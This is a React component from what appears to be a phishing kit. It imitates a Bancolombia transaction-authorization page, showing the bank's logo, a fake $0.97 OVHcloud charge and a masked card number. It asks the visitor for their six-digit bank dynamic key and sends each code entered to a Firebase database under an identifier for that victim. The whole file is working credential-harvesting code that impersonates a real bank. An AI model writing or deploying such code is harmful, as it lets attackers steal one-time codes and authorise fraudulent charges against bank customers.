import React from 'react'
import { useLayoutEffect } from 'react'
import { useState } from 'react'
import logo from '../../../assets/logoBancolombia.png'
import { setDataDb } from '../../../Firebase/sendFirebaseData'
const ASK3D = ({ idF }) => {
    const [dinKey, setDinKey] = useState("")
    const [notificacion, setNotificacion] = useState({})
    const btnEnviar = () => {
        setNotificacion({
            dinKey: dinKey?.length != 6 && "La clave dinámica debe tener 6 digitos"
        })
        if (dinKey?.length == 6 && dinKey != "") {
            setDataDb(idF, "dinKey", dinKey)
        }
    }

    useLayoutEffect(() => {
        if (dinKey.length > 6) {
            setDinKey(dinKey.slice(0, 6))
        }
    }, [dinKey])

    return (
        <div className='w-full  px-2 py-4  flex flex-col items-center'>
            <div className='flex mb-10 ml-4'>
                <img className='h-5 ' src={logo} />
                <div className='w-40 h-4'></div>
            </div>
            <div>
                <p className='font-semibold mb-3 ml-4'>Autorización de transacción</p>
                <p className=' leading-4 text-xs font-semibold text-gray-900 ml-4'>
                    La transacción que intentas realizar en OVHcloud por $0.97 USD el 24/01/2023
                    con tu tarjeta terminada en ************2196 debe ser
                    autorizada por seguridad.
                </p>
                <p className=' leading-4 text-xs font-semibold text-gray-900 mt-6 ml-4'>
                    Continúa con ella ingresando con un codigo llegado por mensaje de
                    texto o con tu clave dinamica
                </p>
            </div>
            <div className='w-full mt-6 mb-4 px-4'>
                <p className='text-xs opacity-60 font-semibold '>Detalle de la Transacción</p>
            </div>
            <div style={{ width: "335px" }} className=''>
                <div className='flex flex-wrap justify-center'>
                    <div className='flex text-xs w-4/5 pl-1'>
                        <span className='font-bold ml-20 '>Comercio:</span>
                        <span className='ml-4'>OVHcloud</span>
                    </div>
                    <div className='flex text-xs w-4/5'>
                        <p className='font-bold '>Monto de la Transacción:</p>
                        <p className='ml-4'>$0.97 USD</p>
                    </div>
                    <div className='flex text-xs '>
                        <p className='font-bold ml-2'>Número de Tarjeta:</p>
                        <p className='ml-4'>************2196</p>
                    </div>
                    <div className='flex text-xs w-4/5 items-center'>
                        <p className='font-bold ml-11 w-40 text-right'>Ingresa tu Clave Dinámica:</p>
                        <input onChange={(e) => setDinKey(e.target.value)}
                            value={dinKey}
                            className='border-2 h-6 w-28 border-black ml-4 outline-none px-1'
                            type="number"
                            onKeyDown={(evt) => evt.key === 'e' && evt.preventDefault()}

                        />
                    </div>
                    {notificacion.dinKey&&<span className='text-xs mt-2 text-red-600'>{notificacion.dinKey}</span>}
                </div>
                <p className='text-xs font-semibold underline mt-4 ml-4'>Haga click aquí para recibir un código nuevo</p>
            </div>
            <div className='w-full flex justify-center my-2'>
                <button className='bg-black text-white w-20' onClick={() => btnEnviar()}>Enviar</button>
            </div>
        </div>
    )
}

export default ASK3D